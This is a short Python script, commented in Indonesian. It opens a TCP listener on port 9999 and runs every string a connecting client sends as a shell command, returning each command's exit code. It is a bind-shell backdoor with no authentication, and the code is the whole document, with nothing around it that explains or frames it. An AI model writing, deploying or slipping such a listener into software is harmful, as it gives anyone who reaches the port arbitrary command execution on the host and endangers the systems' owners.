import socket
import subprocess

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("ip", 9999))

s.listen(1)
conn, addr = s.accept()

while True:
    conn.sendall("execute: ".encode())
    #inputan
    command = conn.recv(1024).decode("utf-8").strip()

    if not command:
        break
    
    try:
        #command
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        #Kalo g ada
        conn.sendall("127\n".encode())
    else:
        #Kalo ada munculin return code
        conn.sendall(str(result.returncode).encode() + b'\n')

conn.close()
